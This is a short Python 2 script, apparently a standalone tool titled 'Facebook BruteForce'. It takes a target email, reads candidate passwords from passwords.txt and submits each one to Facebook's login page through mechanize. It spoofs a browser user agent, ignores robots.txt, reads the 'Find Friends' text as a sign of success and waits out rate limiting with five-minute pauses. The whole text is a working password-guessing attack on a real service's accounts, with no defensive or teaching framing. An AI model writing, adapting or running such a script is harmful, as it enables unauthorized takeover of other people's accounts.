url='https://www.facebook.com/login.php'
headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'}
try:
	import mechanize
	import urllib2
	br = mechanize.Browser()
	br.addheaders = [('User-Agent',headers['User-Agent'])]
	br.set_handle_robots(False)
except:
	print('\n\tPlease install mechanize.\n')
	sys.exit()

print('\n---------- Welcome To Facebook BruteForce ----------\n')
try:
	file=open('passwords.txt','r')
except:
	print('creat passwords file in PWD with the name : passwords.txt')

email=str(raw_input('Enter Email/Username : ').strip())
print("\nTarget Email ID : ",email)
print("\nTrying Passwords from list ...")

i=0
while file:
	passw=file.readline().strip()
	i+=1
	if len(passw) < 6:
		continue
	print(str(i) +" : ",passw)
	res = br.open(url)
	try:
		if res.code == 200:
			br.select_form(nr=0)
			br.form['email'] = email
			br.form['pass'] = passw
			res = br.submit()
			if 'Find Friends' in res.read():
				print('Your password is : ',passw)
				break
	except:
		print('\nSleeping for time : 5 min\n')
		time.sleep(300)
